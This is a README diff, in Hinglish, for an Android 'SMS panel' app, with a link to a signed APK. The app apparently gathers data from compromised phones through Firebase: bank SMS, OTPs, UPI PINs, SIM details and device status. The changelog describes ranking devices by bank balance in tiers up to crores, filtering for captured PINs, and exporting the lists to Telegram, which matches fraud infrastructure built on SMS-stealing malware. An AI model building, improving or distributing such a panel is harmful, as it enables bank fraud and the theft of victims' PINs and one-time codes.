@@ -4,10 +4,10 @@ Alag Android app — repo ke bots / Virtus APK se **alag**. TXT me Firebase RTDB
 
 ## Signed APK
 
-**Download (repo release):**  
-`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0-release-signed.apk`
+**Download (latest signed, v1.0.4):**  
+`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.4-release-signed.apk`
 
-**Signed** (release keystore CI) — phone pe “Install unknown apps” allow karo; production app-store ke liye apni release key use karo.
+**Signed** — phone pe “Install unknown apps” allow karo. Older: `FirebaseSmsPanel-1.0-release-signed.apk` (purana build).
 
 ### Build locally (2 min)
 
@@ -41,20 +41,17 @@ Optional (unsigned, agar repo me rakha ho):
 2. **Fetch Live** → 45s auto-refresh ON + immediate fetch (same filters).
 3. **Start Fetch** → dubara pull (URLs load hone ke baad).
 4. **Export TXT** → filtered device list share (Telegram/Drive).
-5. **Search Here** → device id / model / SIM / Firebase URL / sender / SMS text se filter.
-6. **Yellow + white UI** — list jaisa reference: har device card par **index, mobile name, UPI PIN (Firebase meta ya SMS se), device id, battery %, last date, Online/Offline**; right column **green thumbs-up, blue info (details sheet), red trash** (approve/delete abhi sirf UI). **Live SMS** = white cards, **MSG:** green text, **dono jagah trash icon** (reference jaisa).
-7. **Sort list by** (Bank modes): **₹ Balance** (pehle jaisa High→Low / Low→High band ke andar) ya **Battery %** (High→Low = zyada % upar, Low→High = kam % upar). Balance band sirf bank rules pe; battery sort un devices par jo pass ho rahe hain.
-8. **Virtus-style dashboard** — cards: DEVICES, ONLINE, BALANCE, BANK SMS, PANELS; **Live SMS** = filtered devices ke recent messages.
-9. **Inbox mode (pills)**  
-   - **All bank** — saari bank-like SMS (amount band **nahi** — High/Low sort by amount).  
-   - **Bank + band** — amount sirf **High→Low 50K–90L** ya **Low→High 2K–50K** ke andar.  
-   - **OTP / Jio** — OTP / telco / Jio style alerts (sender ID dikhega).  
-   - **Full inbox** — short-link spam hata ke **jo Firebase pe sync ho** (purani + nayi).  
-10. **PIN filter** — Bank modes: **With PIN** = metadata `upiPin` / SMS se 4–6 digit UPI-style PIN mila **ya** PIN-pattern SMS; **Without** = dono nahi. OTP/Full inbox par PIN chip devices par lagata nahi.
-11. **Connection** — Online / Offline / Both.  
-12. **SMS age** — `1d` … `30d` ya **All (old+new)** — timestamp na ho to bhi message dikhega (purane logs).
-13. **Live refresh** — **Fetch Live** = har **45s** par URLs dubara fetch (job ON).
-14. **Device Details** → card ke **blue Info (i)** se open: SIM, battery, forwarder, UPI PIN, neeche filtered SMS (MSG green). Version **1.0.3**.
+5. **Search Here** + right pe **connection chip** (tap = Online → Offline → Both cycle) — device id / model / SIM / Firebase URL / sender / SMS text se filter.
+6. **Dark dashboard** (Virtus screenshot jaisa): top **TXT / Fetch Live / Export TXT** (yellow outline), metrics cards, pills: **High 1L-20L, Boom 20L-1Cr, Medium 5K, Low→High**, PIN, sort ₹/Battery, SMS age. **App icon** = tumhara **Virtus GT SMS MODULE** logo.
+7. **Device list** — white/yellow reference cards: **index, mobile, UPI PIN, device id, battery, date, status**, action column **thumb / info / trash** (approve/delete UI only). **Live SMS** white cards, **MSG** green.
+8. **Bank+Band tiers** — presets: **High 1L–20L**, **Boom 20L–90L** (label “1Cr style”), **Medium 5K–1L**, **Low→High 2K–50K**. **All bank** = purana 50K–90L / 2K–50K High/Low sort (no tier preset).
+9. **Sort list by** (bank modes): **₹** ya **Battery %** (devices jo filters se pass ho).
+10. **Virtus-style dashboard** — cards: DEVICES, ONLINE, BALANCE, BANK SMS, PANELS; **Live SMS** = filtered recent messages.
+11. **Inbox mode (pills)** — Bank+Band / All bank / OTP / Full (same behavior as before).
+12. **PIN filter** — Bank modes: With / Without / Both (device-level UPI/PIN detection).
+13. **SMS age** — `1d` … `30d` ya **All** (timestamp missing = still shown).
+14. **Live refresh** — **Fetch Live** = 45s job ON.
+15. **Device Details** — card pe **Info (i)**; sheet me SIM, battery, forwarder, UPI PIN, SMS list. **v1.0.4**
 
 ## Data
 
